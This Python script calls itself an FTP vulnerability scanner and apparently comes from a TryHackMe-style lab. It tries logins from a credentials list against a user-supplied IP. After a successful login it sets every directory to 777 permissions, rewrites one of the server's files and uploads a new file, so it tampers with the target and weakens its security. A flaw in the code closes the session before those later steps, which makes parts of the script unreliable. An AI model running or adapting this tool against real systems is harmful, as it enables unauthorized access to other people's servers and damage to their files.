import ftplib
import json
import socket
from io import BytesIO

def is_ftp_port_open(ip, port=21):
    try:
        with socket.create_connection((ip, port), timeout=3):
            print("FTP port is open and responding")
            return True
    except Exception as e:
        print("FTP port check failed:", str(e))
        return False

def try_modify_file(ftp, filename):
    try:
        content = BytesIO()
        ftp.retrbinary(f"RETR {filename}", content.write)
        content.seek(0)
        new_content = content.read() + b"\n# Modified by Vulnerability Scanner"
        ftp.storbinary(f"STOR {filename}", BytesIO(new_content))
        print(f"[MODIFIED] Successfully modified: {filename}")
    except Exception as e:
        print(f"[FAILED] Could not modify {filename}: {e}")

def try_upload_file(ftp):
    try:
        content = BytesIO(b"This file was created during FTP vulnerability test.\n")
        ftp.storbinary("STOR THM.txt", content)
        print("[UPLOADED] Created file: THM.txt")
    except Exception as e:
        print(f"[FAILED] Could not upload THM.txt: {e}")

def list_files(ftp):
    try:
        print("\n[FILES & PERMISSIONS]")
        ftp.dir()
    except Exception as e:
        print(f"[ERROR] Could not list files: {e}")

def chmod_all_dirs(ftp):
    try:
        print("\n[CHMOD] Attempting to set folder permissions to 777...")

        items = []
        ftp.retrlines('LIST', items.append)

        permission_changed = False

        for line in items:
            parts = line.split()
            if len(parts) < 9:
                continue

            name = " ".join(parts[8:])
            file_type = parts[0][0]

            if file_type == 'd':  # Directory
                try:
                    ftp.sendcmd(f'SITE CHMOD 777 {name}')
                    print(f"[CHMOD] Changed permissions for directory: {name}")
                    permission_changed = True
                except Exception as e:
                    print(f"[FAILED] Could not change permissions for {name}: {e}")

        if permission_changed:
            print("\n[UPDATED FILE LIST AFTER CHMOD]")
            list_files(ftp)

    except Exception as e:
        print(f"[ERROR] CHMOD operation failed: {e}")

def get_ftp_details(ftp):
    try:
        # 1. FTP Banner/Welcome Message
        banner = ftp.getwelcome()
        print("\n[FTP BANNER]")
        print(banner)
        
        # 2. FTP Version (can be fetched using FEAT or HELP command)
        features = ftp.sendcmd("FEAT")
        print("\n[FTP FEATURES]")
        print(features)
        
        # 3. FTP System Info
        system_info = ftp.sendcmd("SYST")
        print("\n[FTP SYSTEM INFO]")
        print(system_info)
        
        # 4. Present Working Directory (PWD)
        current_dir = ftp.pwd()
        print("\n[CURRENT DIRECTORY]")
        print(current_dir)
        
        # 5. List of supported FTP commands (HELP)
        supported_commands = ftp.sendcmd("HELP")
        print("\n[SUPPORTED FTP COMMANDS]")
        print(supported_commands)
        
        # 6. Check if PASV (Passive Mode) is supported
        try:
            passive_mode = ftp.sendcmd("PASV")
            print("\n[PASSIVE MODE SUPPORTED]")
            print(passive_mode)
        except Exception as e:
            print("\n[ERROR] Passive mode is not supported or failed to fetch.")
        
        # 7. Check if anonymous login is allowed by listing files in the root
        print("\n[ANONYMOUS ACCESS TEST]")
        try:
            ftp.login("anonymous", "guest")
            print("[INFO] Anonymous login allowed.")
            ftp.quit()
        except Exception as e:
            print("[INFO] Anonymous login not allowed.")
        
    except Exception as e:
        print(f"[ERROR] Could not retrieve FTP details: {e}")

def check_ftp_vulnerability(ip, port):
    if not is_ftp_port_open(ip, port):
        print("Port is not open or does not support FTP")
        return False

    try:
        with open("credentials.json", "r") as file:
            credentials = json.load(file)
    except Exception as e:
        print("Error loading credentials file:", str(e))
        return False

    print(f"\nScanning ftp://{ip}:{port} for FTP login vulnerabilities...\n")

    for entry in credentials:
        username = entry.get("username")
        password = entry.get("password")

        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=5)
            ftp.login(user=username, passwd=password)
            print(f"[SUCCESS] Access granted with {username} / {password}")
            print(f"[VULNERABLE] FTP service on {ip}:{port} is vulnerable.\n")

            # Get FTP details (version, banner, supported commands, etc.)
            get_ftp_details(ftp)

            # Enumerate files and permissions
            list_files(ftp)

            # Try to change folder permissions to 777
            chmod_all_dirs(ftp)

            # Try modifying the first file if possible
            try:
                files = ftp.nlst()
                for file in files:
                    try_modify_file(ftp, file)
                    break  # Only attempt to modify one file
            except Exception as e:
                print(f"[ERROR] Could not retrieve file list for modification: {e}")

            # Try to upload a file
            try_upload_file(ftp)

            ftp.quit()
            return True  # Stop after first success
        except ftplib.error_perm:
            continue
        except Exception as e:
            continue

    print("\n[SECURE] FTP (port 21) is not vulnerable.\n")
    return False

if __name__ == "__main__":
    target_ip = input("Enter target IP: ").strip()
    target_port = input("Enter port (default 21): ").strip()
    port = int(target_port) if target_port else 21
    check_ftp_vulnerability(target_ip, port)
